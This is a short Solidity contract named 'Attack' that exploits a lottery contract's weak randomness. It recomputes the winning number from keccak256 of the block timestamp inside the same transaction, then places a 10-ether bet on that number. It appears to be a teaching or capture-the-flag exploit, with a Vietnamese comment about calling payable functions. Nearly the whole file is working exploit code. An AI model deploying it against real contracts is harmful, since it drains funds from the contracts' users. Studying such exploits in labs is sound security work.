//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ILottery {
     function placeBet(uint8 _number) external payable;
}

contract Attack is Ownable{
     ILottery private victim;

     constructor (address _victim) {
          victim = ILottery(_victim);
     }

     function attack() external payable onlyOwner {
          uint8 winningNumber = getWinningNumber();
          victim.placeBet{value: 10 ether}(winningNumber); // Cách gọi hàm payable
     }

     function getWinningNumber () private view returns (uint8) {
          return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254 ) + 1;
     }
}